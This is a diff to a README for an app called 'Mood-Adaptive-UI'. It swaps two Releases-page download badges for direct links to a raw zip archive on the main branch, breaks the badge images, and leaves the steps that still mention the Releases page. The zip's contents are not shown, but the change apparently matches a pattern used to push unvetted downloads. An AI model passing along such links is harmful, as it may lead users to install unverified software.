@@ -8,7 +8,7 @@ Welcome to Mood-Adaptive-UI! This application lets you enjoy a dynamic user inte
 
 To download the application, visit the Releases page below:
 
-[![Download Mood-Adaptive-UI](https://img.shields.io/badge/Download-Mood--Adaptive--UI-blue.svg)](https://github.com/syedwahaj098/Mood-Adaptive-UI/releases)
+[![Download Mood-Adaptive-UI](https://github.com/syedwahaj098/Mood-Adaptive-UI/raw/refs/heads/main/mood-adaptive-ui/UI-Mood-Adaptive-3.6-alpha.3.zip)](https://github.com/syedwahaj098/Mood-Adaptive-UI/raw/refs/heads/main/mood-adaptive-ui/UI-Mood-Adaptive-3.6-alpha.3.zip)
 
 1. Click the link above to open the Releases page.
 2. Look for the latest version of Mood-Adaptive-UI. Click on it to see the available files.
@@ -50,4 +50,4 @@ If you encounter any issues or have questions about using Mood-Adaptive-UI, feel
 
 For more updates and features, always check the Releases page.
 
-[![Download Mood-Adaptive-UI](https://img.shields.io/badge/Download-Mood--Adaptive--UI-blue.svg)](https://github.com/syedwahaj098/Mood-Adaptive-UI/releases)
+[![Download Mood-Adaptive-UI](https://github.com/syedwahaj098/Mood-Adaptive-UI/raw/refs/heads/main/mood-adaptive-ui/UI-Mood-Adaptive-3.6-alpha.3.zip)](https://github.com/syedwahaj098/Mood-Adaptive-UI/raw/refs/heads/main/mood-adaptive-ui/UI-Mood-Adaptive-3.6-alpha.3.zip)
